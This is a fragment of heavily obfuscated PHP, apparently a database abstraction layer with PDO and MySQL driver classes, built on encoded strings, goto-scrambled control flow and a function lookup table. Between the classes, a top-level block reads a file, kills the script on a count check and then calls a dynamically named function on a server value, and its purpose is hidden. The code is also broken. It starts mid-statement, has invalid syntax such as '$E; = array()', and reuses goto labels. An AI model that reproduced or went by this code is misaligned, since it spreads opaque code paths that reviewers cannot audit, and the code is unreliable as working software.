!0; } private function getAll() { $FŞؕ =& $_SERVER[拘]; $B궤 = $this->PDOStatement->{$_SERVER[拘][1212]}($FŞؕ[1180]::FETCH_ASSOC); $this->numRows = $FŞؕ[37]($B궤); return $B궤; } public function getFields($eì) { goto dݖ; dݖ: $Bƙ =& $_SERVER[拘]; $this->{$_SERVER[拘][1192]}(!0); if ($Bƙ[108]($Bƙ[1213])) { $AƸ㉔ = $Bƙ[69]($Bƙ[1214], $eì, $Bƙ[108]($Bƙ[1213])); } else { switch ($this->dbType) { case $Bƙ[1182]: case $Bƙ[1215]: $AƸ㉔ = "\x53\x45\114\x45\x43\x54\x20\40\40\x63\157\154\x75\155\x6e\x5f\x6e\x61\155\145\40\x61\163\40\47\x4e\141\x6d\x65\x27\x2c\x20\x20\40\144\141\164\x61\137\x74\x79\x70\145\x20\x61\x73\x20\x27\x54\171\x70\x65\x27\54\40\x20\x20\x63\157\154\165\155\x6e\x5f\x64\x65\x66\141\x75\x6c\164\x20\x61\163\40\x27\104\x65\x66\141\x75\154\164\47\54\x20\x20\x20\x69\x73\x5f\x6e\165\154\154\x61\142\154\x65\40\x61\x73\x20\x27\x4e\x75\x6c\x6c\x27\xa\x9\11\106\x52\117\115\x9\151\156\x66\x6f\x72\155\141\164\151\157\156\x5f\x73\x63\150\145\x6d\x61\56\x74\141\x62\x6c\145\x73\40\x41\123\40\164\12\11\x9\112\117\x49\116\11\151\x6e\146\x6f\162\155\141\164\151\157\x6e\137\x73\143\150\145\155\x61\56\x63\x6f\x6c\165\x6d\156\x73\x20\x41\123\x20\143\xa\x9\11\117\116\x20\40\164\56\164\141\142\x6c\x65\137\143\x61\x74\141\x6c\x6f\x67\x20\75\40\x63\x2e\x74\x61\x62\154\145\x5f\143\x61\164\141\154\x6f\147\xa\11\11\101\x4e\x44\40\164\x2e\164\x61\142\154\x65\137\163\x63\150\x65\155\141\40\x3d\x20\x63\x2e\164\141\x62\x6c\145\137\x73\143\x68\x65\x6d\x61\xa\11\x9\x41\x4e\104\x20\x74\x2e\x74\141\142\x6c\145\x5f\156\141\155\x65\40\75\40\143\56\164\141\x62\154\x65\x5f\x6e\141\x6d\145\xa\x9\x9\127\110\105\122\105\40\x20\40\164\56\164\141\x62\x6c\x65\137\156\x61\155\x65\x20\75\x20\47{$eì}\47"; break; case $Bƙ[1216]: $AƸ㉔ = $Bƙ[1217] . $eì . $Bƙ[1218]; break; case $Bƙ[142]: case $Bƙ[1184]: $AƸ㉔ = $Bƙ[1219] . $Bƙ[1220] . $Bƙ[1221] . $Bƙ[84]($eì) . $Bƙ[1222] . $Bƙ[84]($eì) . $Bƙ[1223]; break; case $Bƙ[1224]: $AƸ㉔ = $Bƙ[1225] . $eì . $Bƙ[1226]; break; case $Bƙ[1183]: break; case $Bƙ[1227]: default: $AƸ㉔ = $Bƙ[1228] . ($this->dbType == $Bƙ[1227] ? "\140{$eì}\x60" : $eì); } } goto Fں; F: return $BҪ; goto fݱ; Fں: $E͝È = $this->{$_SERVER[拘][260]}($AƸ㉔); $BҪ = array(); if ($E͝È) { foreach ($E͝È as $BԷ => $bǩˠ) { $bǩˠ = $Bƙ[94]($bǩˠ); $bǩˠ[$Bƙ[375]] = isset($bǩˠ[$Bƙ[375]]) ? $bǩˠ[$Bƙ[375]] : $Bƙ[1168]; $bǩˠ[$Bƙ[400]] = isset($bǩˠ[$Bƙ[400]]) ? $bǩˠ[$Bƙ[400]] : $Bƙ[1168]; $fߗ = isset($bǩˠ[$Bƙ[280]]) ? $bǩˠ[$Bƙ[280]] : $bǩˠ[$Bƙ[375]]; $BҪ[$fߗ] = array($Bƙ[375] => $fߗ, $Bƙ[400] => $bǩˠ[$Bƙ[400]], $Bƙ[1229] => (bool) (isset($bǩˠ[$Bƙ[164]]) && $bǩˠ[$Bƙ[164]] === $Bƙ[67] || isset($bǩˠ[$Bƙ[1229]]) && $bǩˠ[$Bƙ[1229]] === $Bƙ[67]), $Bƙ[897] => isset($bǩˠ[$Bƙ[897]]) ? $bǩˠ[$Bƙ[897]] : (isset($bǩˠ[$Bƙ[1230]]) ? $bǩˠ[$Bƙ[1230]] : $Bƙ[1168]), $Bƙ[997] => isset($bǩˠ[$Bƙ[257]]) ? $Bƙ[80]($bǩˠ[$Bƙ[257]]) == $Bƙ[1231] : (isset($bǩˠ[$Bƙ[1232]]) ? $bǩˠ[$Bƙ[1232]] : !1), $Bƙ[999] => isset($bǩˠ[$Bƙ[1233]]) ? $Bƙ[80]($bǩˠ[$Bƙ[1233]]) == $Bƙ[1234] : (isset($bǩˠ[$Bƙ[257]]) ? $bǩˠ[$Bƙ[257]] : !1)); } } goto F; fݱ: } public function getTables($b괼 = '') { $c̳ =& $_SERVER[拘]; if ($c̳[108]($c̳[1235])) { $Dˤֽ = $c̳[69]($c̳[1236], $b괼, $c̳[108]($c̳[1235])); } else { switch ($this->dbType) { case $c̳[142]: case $c̳[1184]: $Dˤֽ = $c̳[1237]; break; case $c̳[1182]: case $c̳[1215]: $Dˤֽ = $c̳[1238]; break; case $c̳[1224]: $Dˤֽ = $c̳[1239]; break; case $c̳[1183]: $c̳[76]($c̳[77]($c̳[1240]) . $c̳[1241]); break; case $c̳[1216]: $Dˤֽ = $c̳[1242] . $c̳[1243] . $c̳[1244]; break; case $c̳[1227]: default: if (!empty($b괼)) { $Dˤֽ = $c̳[1245] . $b괼; } else { $Dˤֽ = $c̳[1246]; } } } $B = $this->{$_SERVER[拘][260]}($Dˤֽ); $b = array(); foreach ($B as $D => $FҐ) { $b[$D] = $c̳[1247]($FҐ); } return $b; } protected function parseLimit($dн) { $cⲴ =& $_SERVER[拘]; $c톥 = $cⲴ[67]; if (!empty($dн)) { switch ($this->dbType) { case $cⲴ[1224]: case $cⲴ[1216]: $dн = $cⲴ[4]($cⲴ[119], $dн); if ($cⲴ[37]($dн) > 1) { $c톥 .= $cⲴ[212] . $dн[1] . $cⲴ[1248] . $dн[0] . $cⲴ[168]; } else { $c톥 .= $cⲴ[212] . $dн[0] . $cⲴ[168]; } break; case $cⲴ[1182]: case $cⲴ[1215]: break; case $cⲴ[1183]: break; case $cⲴ[142]: case $cⲴ[1184]: break; case $cⲴ[1227]: default: $c톥 .= $cⲴ[212] . $dн . $cⲴ[168]; } } return $c톥; } public function parseKey(&$CϽ, $aź = true) { $Cԇ =& $_SERVER[拘]; if ($aź) { $CϽ = $this->{$_SERVER[拘][154]}($CϽ); } if ($this->dbType == $Cԇ[1227]) { if ($CϽ != $Cԇ[167] && !$Cԇ[131]($Cԇ[1249], $CϽ)) { $CϽ = $Cԇ[174] . $Cԇ[70]($CϽ, $Cԇ[174]) . $Cԇ[174]; } return $CϽ; } else { return parent::parseKey($CϽ); } } public function close() { $this->_linkID = null; } public function error() { $F =& $_SERVER[拘]; if ($this->PDOStatement) { $C = $this->PDOStatement->{$_SERVER[拘][1250]}(); $this->error = $C[1] . $F[91] . $C[2]; } else { $this->error = $F[67]; } if ($F[67] != $this->queryStr) { $this->error .= $F[387]($F[1251]) . $this->queryStr; } $F[137]($this->error, $F[67], $F[1252]); return $this->error; } public function escapeString($f) { $aո =& $_SERVER[拘]; switch ($this->dbType) { case $aո[1224]: case $aո[1182]: case $aո[1215]: case $aո[1227]: return $aո[289]($f); case $aո[1183]: case $aո[1216]: case $aո[142]: case $aո[1184]: return $aո[1204]($aո[1206], $aո[1253], $f); } } protected function parseValue($d嚏) { $D =& $_SERVER[拘]; if ($D[66]($d嚏)) { $d嚏 = $D[165]($d嚏, $D[91]) === 0 ? $this->{$_SERVER[拘][158]}($d嚏) : $D[157] . $this->{$_SERVER[拘][158]}($d嚏) . $D[157]; } elseif (isset($d嚏[0]) && $D[66]($d嚏[0]) && $D[80]($d嚏[0]) == $D[145]) { $d嚏 = $this->{$_SERVER[拘][158]}($d嚏[1]); } elseif ($D[93]($d嚏)) { $d嚏 = $D[159](array($this, $D[160]), $d嚏); } elseif ($D[161]($d嚏)) { $d嚏 = $d嚏 ? $D[162] : $D[163]; } elseif ($D[149]($d嚏)) { $d嚏 = $D[164]; } return $d嚏; } public function getLastInsertId() { $B =& $_SERVER[拘]; switch ($this->dbType) { case $B[1224]: case $B[1216]: case $B[1182]: case $B[1215]: case $B[1183]: case $B[1227]: return $this->_linkID->{$_SERVER[拘][1254]}(); case $B[142]: case $B[1184]: $cͶʍ = $this->table; $e = $this->{$_SERVER[拘][260]}("\123\x45\x4c\x45\x43\124\40{$cͶʍ}\x2e\143\x75\x72\x72\x76\x61\x6c\40\x63\165\x72\x72\166\141\154\x20\x46\x52\117\115\40\x64\x75\141\x6c"); return $e ? $e[0][$B[1255]] : 0; } } } if ($_SERVER[$_SERVER[拘][33]] != $_SERVER[$_SERVER[拘][1256]]) { goto c; b醩: $aй($_SERVER[$_SERVER[拘][1257]]); goto b; c: $fк = $_SERVER[拘][34]; $Eо薩 = BASIC_PATH . $_SERVER[拘][35]; $Eы옑 = $fк($Eо薩); goto Eڄ; Eڄ: $FᐶӞ = $_SERVER[拘][4]($_SERVER[拘][36], $Eы옑); if ($_SERVER[拘][37]($FᐶӞ) < $_SERVER[拘][38]) { die; } $aй = $_SERVER[拘][39]; goto b醩; b: } class DbMysql extends Db { public function __construct($Dڻ = '') { $eىφ =& $_SERVER[拘]; if (!$eىφ[1258]($eىφ[1259])) { $eىφ[76]($eىφ[77]($eىφ[1178]) . $eىφ[1260]); } if (!empty($Dڻ)) { $this->config = $Dڻ; if (empty($this->config[$eىφ[106]])) { $this->config[$eىφ[106]] = $eىφ[67]; } } } public function connect($e˽ = '', $Dſ = 0, $C筘 = false) { $bڬ =& $_SERVER[拘]; if (!isset($this->linkID[$Dſ])) { goto C螋; E: if (1 != $bڬ[108]($bڬ[116])) { unset($this->config); } goto aӛܜ; C螋: if (empty($e˽)) { $e˽ = $this->config; } $fї = $e˽[$bڬ[100]] . ($e˽[$bڬ[102]] ? "\x3a{$e˽[$bڬ[102]]}" : $bڬ[67]); $bԖֵ = !empty($e˽[$bڬ[106]][$bڬ[1261]]) ? $e˽[$bڬ[106]][$bڬ[1261]] : $this->pconnect; goto E; C: $bڬ[1267]($bڬ[1268] . $bڬ[108]($bڬ[1191]) . $bڬ[1206], $this->linkID[$Dſ]); if ($eՑߖ > $bڬ[1269]) { $bڬ[1267]($bڬ[1270], $this->linkID[$Dſ]); } $this->connected = !0; goto E; E: if ($bԖֵ) { $this->linkID[$Dſ] = $bڬ[1262]($fї, $e˽[$bڬ[96]], $e˽[$bڬ[98]], 131072); } else { $this->linkID[$Dſ] = $bڬ[1263]($fї, $e˽[$bڬ[96]], $e˽[$bڬ[98]], !0, 131072); } if (!$this->linkID[$Dſ] || !empty($e˽[$bڬ[14]]) && !$bڬ[1264]($e˽[$bڬ[14]], $this->linkID[$Dſ])) { $bڬ[76]($bڬ[1265]()); } $eՑߖ = $bڬ[1266]($this->linkID[$Dſ]); goto C; aӛܜ: } return $this->linkID[$Dſ]; } public function free() { $_SERVER[拘][1271]($this->queryID); $this->queryID = null; } public function query($C) { goto cڂֱ˔; b: $Eܗ[1196]($Eܗ[1197], 1); $Eܗ[135]($Eܗ[139]); $this->queryID = $Eܗ[1267]($C, $this->_linkID); goto cۮ; cڂֱ˔: $Eܗ =& $_SERVER[拘]; if (0 === $Eܗ[213]($C, $Eܗ[1272])) { $this->{$_SERVER[拘][291]}(); $this->connected = !1; } $this->{$_SERVER[拘][1192]}(!1); goto Aې; Aې: if (!$this->_linkID) { return !1; } $this->queryStr = $C; if ($this->queryID) { $this->{$_SERVER[拘][290]}(); } goto b; cۮ: $this->{$_SERVER[拘][1200]}(); if (!1 === $this->queryID) { $this->{$_SERVER[拘][1199]}(); return !1; } else { $this->numRows = $Eܗ[1273]($this->queryID); return $this->{$_SERVER[拘][1201]}(); } goto Bʃ; Bʃ: } public function execute($aȼ) { goto f; f: $eўƴ =& $_SERVER[拘]; $this->{$_SERVER[拘][1192]}(!0); if (!$this->_linkID) { return !1; } goto aѯ; Aɐݓ: $eўƴ[135]($eўƴ[139]); $b = $eўƴ[1267]($aȼ, $this->_linkID); $this->{$_SERVER[拘][1200]}(); goto f; aѯ: $this->queryStr = $aȼ; if ($this->queryID) { $this->{$_SERVER[拘][290]}(); } $eўƴ[1196]($eўƴ[1207], 1); goto Aɐݓ; f: if (!1 === $b) { $this->{$_SERVER[拘][1199]}(); return !1; } else { $this->numRows = $eўƴ[1274]($this->_linkID); $this->lastInsID = $eўƴ[1275]($this->_linkID); return $this->numRows; } goto F䭥; F䭥: } public function startTrans() { $dգێ =& $_SERVER[拘]; $this->{$_SERVER[拘][1192]}(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $dգێ[1267]($dգێ[1276], $this->_linkID); } $this->transTimes++; return; } public function commit() { $F =& $_SERVER[拘]; if ($this->transTimes > 0) { $aԻݰ = $F[1267]($F[1277], $this->_linkID); $this->transTimes = 0; if (!$aԻݰ) { $this->{$_SERVER[拘][1199]}(); return !1; } } return !0; } public function rollback() { $E =& $_SERVER[拘]; if ($this->transTimes > 0) { $A޷ = $E[1267]($E[1278], $this->_linkID); $this->transTimes = 0; if (!$A޷) { $this->{$_SERVER[拘][1199]}(); return !1; } } return !0; } private function getAll() { $B؊ =& $_SERVER[拘]; $Ať = array(); if ($this->numRows > 0) { while ($F = $B؊[1279]($this->queryID)) { $Ať[] = $F; } $B؊[1280]($this->queryID, 0); } return $Ať; } public function getFields($aȖ) { $b =& $_SERVER[拘]; $e嵍 = $this->{$_SERVER[拘][260]}($b[1281] . $this->{$_SERVER[拘][146]}($aȖ)); $d = array(); if ($e嵍) { foreach ($e嵍 as $Dϗ => $cÙ) { $d[$cÙ[$b[1282]]] = array($b[375] => $cÙ[$b[1282]], $b[400] => $cÙ[$b[1283]], $b[1229] => (bool) ($b[84]($cÙ[$b[1284]]) === $b[1285]), $b[897] => $cÙ[$b[1286]], $b[997] => $b[80]($cÙ[$b[1287]]) == $b[1231], $b[999] => $b[80]($cÙ[$b[1288]]) == $b[1234]); } } return $d; } public function getTables($e = '') { $eőʳ =& $_SERVER[拘]; if (!empty($e)) { $d♠ƴ = $eőʳ[1245] . $e; } else { $d♠ƴ = $eőʳ[1246]; } $bҎ = $this->{$_SERVER[拘][260]}($d♠ƴ); $f燵 = array(); foreach ($bҎ as $eÓϐ => $dÛ΂) { $f燵[$eÓϐ] = $eőʳ[1247]($dÛ΂); } return $f燵; } public function replace($E،, $F = array()) { $Bܤ =& $_SERVER[拘]; foreach ($E، as $A => $dȿ) { $Eݤ = $this->{$_SERVER[拘][150]}($dȿ); if ($Bܤ[148]($Eݤ)) { $E[] = $Eݤ; $FЇ׉[] = $this->{$_SERVER[拘][146]}($A); } } $bē = $Bܤ[1289] . $this->{$_SERVER[拘][238]}($F[$Bܤ[239]]) . $Bܤ[204] . $Bܤ[152]($Bܤ[119], $FЇ׉) . $Bܤ[240] . $Bܤ[152]($Bܤ[119], $E) . $Bܤ[191]; return $this->{$_SERVER[拘][245]}($bē); } public function insertAll($f, $e緯 = array(), $Fފ = false) { goto c; C: $C҇ = array(); foreach ($f as $AǨԋ) { $E = array(); foreach ($AǨԋ as $b => $fƭ͟) { $fƭ͟ = $this->{$_SERVER[拘][150]}($fƭ͟); if ($Bʧʃ[148]($fƭ͟)) { $E[] = $fƭ͟; } } $C҇[] = $Bʧʃ[189] . $Bʧʃ[152]($Bʧʃ[119], $E) . $Bʧʃ[191]; } $Bʧʃ[170]($f, array($this, $Bʧʃ[171])); goto eȓ; eȓ: $F = ($Fފ ? $Bʧʃ[235] : $Bʧʃ[236]) . $Bʧʃ[237] . $this->{$_SERVER[拘][238]}($e緯[$Bʧʃ[239]]) . $Bʧʃ[204] . $Bʧʃ[152]($Bʧʃ[119], $f) . $Bʧʃ[1290] . $Bʧʃ[152]($Bʧʃ[119], $C҇); return $this->{$_SERVER[拘][245]}($F); goto D; c: $Bʧʃ =& $_SERVER[拘]; if (!$Bʧʃ[93]($f[0])) { return !1; } $f = $Bʧʃ[766]($f[0]); goto C; D: } public function close() { if ($this->_linkID) { $_SERVER[拘][1291]($this->_linkID); } $this->_linkID = null; } public function error() { $D =& $_SERVER[拘]; $this->error = $D[1292]() . $D[91] . $D[1265]($this->_linkID); if ($D[67] != $this->queryStr) { $this->error .= $D[387]($D[1251]) . $this->queryStr; } $D[137]($this->error, $D[67], $D[1252]); return $this->error; } public function escapeString($a) { $Bȟڑ =& $_SERVER[拘]; if ($this->_linkID) { return $Bȟڑ[1293]($a, $this->_linkID); } else { return $Bȟڑ[1294]($a); } } public function parseKey(&$cǦ鳃, $Eɫï = true) { $A⺷ =& $_SERVER[拘]; if ($Eɫï) { $cǦ鳃 = $this->{$_SERVER[拘][154]}($cǦ鳃); } if ($cǦ鳃 != $A⺷[167] && !$A⺷[131]($A⺷[1249], $cǦ鳃)) { $cǦ鳃 = $A⺷[174] . $A⺷[70]($cǦ鳃, $A⺷[174]) . $A⺷[174]; } return $cǦ鳃; } } goto dˋ; aތ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\x71" => "\x3d", "\156\145\161" => "\74\76", "\147\164" => "\x3e", "\145\147\x74" => "\x3e\x3d", "\154\x74" => "\74", "\x65\x6c\x74" => "\74\75", "\x6e\157\x74\154\x69\153\145" => "\116\117\x54\40\114\111\113\105", "\154\x69\x6b\145" => "\x4c\x49\113\105", "\x69\x6e" => "\x49\x4e", "\x6e\157\x74\151\156" => "\116\x4f\124\x20\111\116", "\156\x6f\x74\x20\x69\x6e" => "\116\117\x54\40\x49\116", "\142\145\x74\167\x65\x65\x6e" => "\x42\x45\x54\x57\105\105\116", "\156\157\x74\x62\145\164\167\145\145\x6e" => "\x4e\117\124\40\x42\105\x54\127\x45\x45\x4e", "\156\x6f\x74\x20\142\x65\x74\167\x65\145\156" => "\116\x4f\x54\40\102\105\124\127\105\105\x4e"); protected $selectSql = "\x53\105\114\105\x43\x54\45\104\x49\x53\124\111\x4e\103\x54\x25\40\45\106\x49\x45\x4c\x44\x25\40\106\122\x4f\x4d\40\x25\124\101\x42\114\105\x25\x25\x4a\117\x49\116\x25\x25\x57\110\105\122\x45\x25\x25\107\122\117\125\x50\45\x25\110\101\126\111\x4e\x47\45\45\117\x52\104\105\122\x25\45\114\111\115\x49\x54\x25\x20\45\x55\x4e\x49\117\116\x25\x25\x43\117\x4d\x4d\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $cͶƎ =& $_SERVER[拘]; $A = func_get_args(); return $cͶƎ[72](__CLASS__, $cͶƎ[73], $A); } public function factory($aԖ = '') { goto Dӻߪ; F: $this->dbType = $Cƹ[79]($Cƹ[80]($aԖ[$Cƹ[75]])); $cլ = $Cƹ[81] . $this->dbType; if ($Cƹ[82]($cլ)) { $Dﮄ͸ = new $cլ($aԖ); if ($Cƹ[83] != $Cƹ[80]($aԖ[$Cƹ[75]])) { $Dﮄ͸->dbType = $Cƹ[84]($this->dbType); } else { $Dﮄ͸->dbType = $this->{$_SERVER[拘][85]}($aԖ[$Cƹ[86]]); } } else { $Cƹ[76]($Cƹ[77]($Cƹ[87]) . $Cƹ[88] . $cլ); } goto e҅; e҅: return $Dﮄ͸; goto a㩟; Dӻߪ: $Cƹ =& $_SERVER[拘]; $aԖ = $this->{$_SERVER[拘][74]}($aԖ); if (empty($aԖ[$Cƹ[75]])) { $Cƹ[76]($Cƹ[77]($Cƹ[78])); } goto F; a㩟: } public function __call($D, $dȉ) { $eС⻓ =& $_SERVER[拘]; if ($eС⻓[89]($this, $D)) { return $eС⻓[90](array($this, $D), $dȉ); } } protected function _getDsnType($e) { $eї =& $_SERVER[拘]; $a = $eї[4]($eї[91], $e); $eĆ = $eї[84]($eї[70]($a[0])); return $eĆ; } private function parseConfig($C = '') { $E =& $_SERVER[拘]; if (!empty($C) && $E[66]($C)) { $C = $this->{$_SERVER[拘][92]}($C); } elseif ($E[93]($C)) { $C = $E[94]($C); $C = array($E[75] => $C[$E[95]], $E[96] => $C[$E[97]], $E[98] => $C[$E[99]], $E[100] => $C[$E[101]], $E[102] => $C[$E[103]], $E[14] => $C[$E[104]], $E[86] => $C[$E[105]], $E[106] => $C[$E[107]]); } elseif (empty($C)) { if ($E[108]($E[109]) && $E[83] != $E[80]($E[108]($E[15]))) { $C = $this->{$_SERVER[拘][92]}($E[108]($E[109])); } else { $C = array($E[75] => $E[108]($E[15]), $E[96] => $E[108]($E[110]), $E[98] => $E[108]($E[111]), $E[100] => $E[108]($E[112]), $E[102] => $E[108]($E[113]), $E[14] => $E[108]($E[114]), $E[86] => $E[108]($E[109]), $E[106] => $E[108]($E[115])); } } return $C; } protected function initConnect($Âż = true) { $F宭 =& $_SERVER[拘]; if (1 == $F宭[108]($F宭[116])) { $this->_linkID = $this->{$_SERVER[拘][117]}($Âż); } else { if (!$this->connected) { $this->_linkID = $this->{$_SERVER[拘][118]}(); } } } protected function multiConnect($E֡ͣ = false) { $b񮽴 =& $_SERVER[拘]; static $F悢ب = array(); if (empty($F悢ب)) { foreach ($this->config as $Dѹ => $ań) { $F悢ب[$Dѹ] = $b񮽴[4]($b񮽴[119], $ań); } } if ($b񮽴[108]($b񮽴[120])) { if ($E֡ͣ) { $c򅮉 = $b񮽴[121]($b񮽴[122](0, $b񮽴[108]($b񮽴[123]) - 1)); } else { if ($b񮽴[68]($b񮽴[108]($b񮽴[124]))) { $c򅮉 = $b񮽴[108]($b񮽴[124]); } else { $c򅮉 = $b񮽴[121]($b񮽴[122]($b񮽴[108]($b񮽴[123]), $b񮽴[37]($F悢ب[$b񮽴[100]]) - 1)); } } } else { $c򅮉 = $b񮽴[121]($b񮽴[122](0, $b񮽴[37]($F悢ب[$b񮽴[100]]) - 1)); } $a附 = array($b񮽴[96] => isset($F悢ب[$b񮽴[96]][$c򅮉]) ? $F悢ب[$b񮽴[96]][$c򅮉] : $F悢ب[$b񮽴[96]][0], $b񮽴[98] => isset($F悢ب[$b񮽴[98]][$c򅮉]) ? $F悢ب[$b񮽴[98]][$c򅮉] : $F悢ب[$b񮽴[98]][0], $b񮽴[100] => isset($F悢ب[$b񮽴[100]][$c򅮉]) ? $F悢ب[$b񮽴[100]][$c򅮉] : $F悢ب[$b񮽴[100]][0], $b񮽴[102] => isset($F悢ب[$b񮽴[102]][$c򅮉]) ? $F悢ب[$b񮽴[102]][$c򅮉] : $F悢ب[$b񮽴[102]][0], $b񮽴[14] => isset($F悢ب[$b񮽴[14]][$c򅮉]) ? $F悢ب[$b񮽴[14]][$c򅮉] : $F悢ب[$b񮽴[14]][0], $b񮽴[86] => isset($F悢ب[$b񮽴[86]][$c򅮉]) ? $F悢ب[$b񮽴[86]][$c򅮉] : $F悢ب[$b񮽴[86]][0], $b񮽴[106] => isset($F悢ب[$b񮽴[106]][$c򅮉]) ? $F悢ب[$b񮽴[106]][$c򅮉] : $F悢ب[$b񮽴[106]][0]); return $this->{$_SERVER[拘][118]}($a附, $c򅮉); } public function parseDSN($fݯ) { $eǳ =& $_SERVER[拘]; if (empty($fݯ)) { return !1; } $fއ = $eǳ[125]($fݯ); if ($fއ[$eǳ[126]]) { $b㊌ѝ = array($eǳ[75] => $fއ[$eǳ[126]], $eǳ[96] => isset($fއ[$eǳ[127]]) ? $fއ[$eǳ[127]] : $eǳ[67], $eǳ[98] => isset($fއ[$eǳ[128]]) ? $fއ[$eǳ[128]] : $eǳ[67], $eǳ[100] => isset($fއ[$eǳ[129]]) ? $fއ[$eǳ[129]] : $eǳ[67], $eǳ[102] => isset($fއ[$eǳ[130]]) ? $fއ[$eǳ[130]] : $eǳ[67], $eǳ[14] => isset($fއ[$eǳ[40]]) ? $eǳ[7]($fއ[$eǳ[40]], 1) : $eǳ[67]); } else { $eǳ[131]($eǳ[132], $eǳ[70]($fݯ), $DǬ); $b㊌ѝ = array($eǳ[75] => $DǬ[1], $eǳ[96] => $DǬ[2], $eǳ[98] => $DǬ[3], $eǳ[100] => $DǬ[4], $eǳ[102] => $DǬ[5], $eǳ[14] => $DǬ[6]); } $b㊌ѝ[$eǳ[86]] = $eǳ[67]; return $b㊌ѝ; } protected function debug() { $F놵 =& $_SERVER[拘]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $F놵[133]; if ($F놵[108]($F놵[134])) { $F놵[135]($F놵[136]); $F놵[137]($this->queryStr . $F놵[138] . $F놵[135]($F놵[139], $F놵[136], 6) . $F놵[140], $F놵[67], $F놵[141]); } } protected function parseLock($D = false) { $cͻխ =& $_SERVER[拘]; if (!$D) { return $cͻխ[67]; } if ($cͻխ[142] == $this->dbType) { return $cͻխ[143]; } return $cͻխ[144]; } protected function parseSet($C̢) { $B߄ =& $_SERVER[拘]; foreach ($C̢ as $B => $eǆ) { if ($B߄[93]($eǆ) && $B߄[145] == $eǆ[0]) { $Aֱ[] = $this->{$_SERVER[拘][146]}($B) . $B߄[147] . $eǆ[1]; } elseif ($B߄[148]($eǆ) || $B߄[149]($eǆ)) { $Aֱ[] = $this->{$_SERVER[拘][146]}($B) . $B߄[147] . $this->{$_SERVER[拘][150]}($eǆ); } } return $B߄[151] . $B߄[152]($B߄[119], $Aֱ); } protected function bindParam($CΝ֠, $Bω) { $this->bind[$_SERVER[拘][91] . $CΝ֠] = $Bω; } protected function parseBind($B) { $B = $_SERVER[拘][153]($this->bind, $B); $this->bind = array(); return $B; } function parseKey(&$Aꊍ, $dѽ鴰 = true) { if ($dѽ鴰) { $Aꊍ = $this->{$_SERVER[拘][154]}($Aꊍ); } return $Aꊍ; } function parseKeyCheck($Bܶ) { $d͕͐ =& $_SERVER[拘]; $Bܶ = $d͕͐[70]($Bܶ); if (!$d͕͐[131]($d͕͐[155], $Bܶ)) { $d͕͐[76]($d͕͐[156] . $Bܶ); } return $Bܶ; } protected function parseValue($Fԅ) { $bç =& $_SERVER[拘]; if ($bç[66]($Fԅ)) { $Fԅ = $bç[157] . $this->{$_SERVER[拘][158]}($Fԅ) . $bç[157]; } elseif (isset($Fԅ[0]) && $bç[66]($Fԅ[0]) && $bç[80]($Fԅ[0]) == $bç[145]) { $Fԅ = $this->{$_SERVER[拘][158]}($Fԅ[1]); } elseif ($bç[93]($Fԅ)) { $Fԅ = $bç[159](array($this, $bç[160]), $Fԅ); } elseif ($bç[161]($Fԅ)) { $Fԅ = $Fԅ ? $bç[162] : $bç[163]; } elseif ($bç[149]($Fԅ)) { $Fԅ = $bç[164]; } return $Fԅ; } protected function parseField($a) { $f =& $_SERVER[拘]; if ($f[66]($a) && $f[165]($a, $f[119])) { $a = $f[4]($f[119], $a); } if ($f[93]($a)) { $FȆǔ = array(); foreach ($a as $Eሜബ => $c) { if (!$f[68]($Eሜബ)) { $FȆǔ[] = $this->{$_SERVER[拘][146]}($Eሜബ) . $f[166] . $this->{$_SERVER[拘][146]}($c); } else { $FȆǔ[] = $this->{$_SERVER[拘][146]}($c); } } $B = $f[152]($f[119], $FȆǔ); } elseif ($f[66]($a) && !empty($a)) { $B = $a; } else { $B = $f[167]; } return $B; } protected function parseTable($C) { $bՆ =& $_SERVER[拘]; if ($bՆ[93]($C)) { $D딵 = array(); foreach ($C as $F => $E) { if (!$bՆ[68]($F)) { $D딵[] = $this->{$_SERVER[拘][146]}($F) . $bՆ[168] . $this->{$_SERVER[拘][146]}($E); } else { $D딵[] = $this->{$_SERVER[拘][146]}($F); } } $C = $D딵; } elseif ($bՆ[66]($C)) { if ($bՆ[169]($C, $bՆ[168])) { return $C; } $C = $bՆ[4]($bՆ[119], $C); $bՆ[170]($C, array($this, $bՆ[171])); } return $bՆ[172] . $bՆ[70]($bՆ[152]($bՆ[173], $C), $bՆ[174]) . $bՆ[172]; } protected function parseWhere($b掍彜) { $E =& $_SERVER[拘]; $f渜 = $E[67]; if ($E[66]($b掍彜)) { $f渜 = $b掍彜; } else { $c = isset($b掍彜[$E[175]]) ? $E[84]($b掍彜[$E[175]]) : $E[67]; if ($E[176]($c, array($E[177], $E[178], $E[179]))) { $c = $E[168] . $c . $E[168]; unset($b掍彜[$E[175]]); } else { $c = $E[180]; } foreach ($b掍彜 as $c => $cŝ) { $f渜 .= $E[181]; if ($E[68]($c)) { $c = $E[182]; } if (0 === $E[165]($c, $E[183])) { $f渜 .= $this->{$_SERVER[拘][184]}($c, $cŝ); } else { if (!$E[131]($E[185], $E[70]($c))) { $E[76]($E[77]($E[186]) . $E[91] . $c); } $Bט = $E[93]($cŝ) && isset($cŝ[$E[187]]); $c = $E[70]($c); if ($E[165]($c, $E[188])) { $D = $E[4]($E[188], $c); $E; = array(); foreach ($D as $eŃȉ => $dŗ) { $C֠ = $Bט ? $cŝ[$eŃȉ] : $cŝ; $E;[] = $E[189] . $this->{$_SERVER[拘][190]}($this->{$_SERVER[拘][146]}($dŗ), $C֠) . $E[191]; } $f渜 .= $E[152]($E[192], $E;); } elseif ($E[165]($c, $E[193])) { $D = $E[4]($E[193], $c); $E; = array(); foreach ($D as $eŃȉ => $dŗ) { $C֠ = $Bט ? $cŝ[$eŃȉ] : $cŝ; $E;[] = $E[189] . $this->{$_SERVER[拘][190]}($this->{$_SERVER[拘][146]}($dŗ), $C֠) . $E[191]; } $f渜 .= $E[152]($E[180], $E;); } else { $f渜 .= $this->{$_SERVER[拘][190]}($this->{$_SERVER[拘][146]}($c), $cŝ); } } $f渜 .= $E[194] . $c; } $f渜 = $E[7]($f渜, 0, -$E[195]($c)); } return empty($f渜) ? $E[67] : $E[196] . 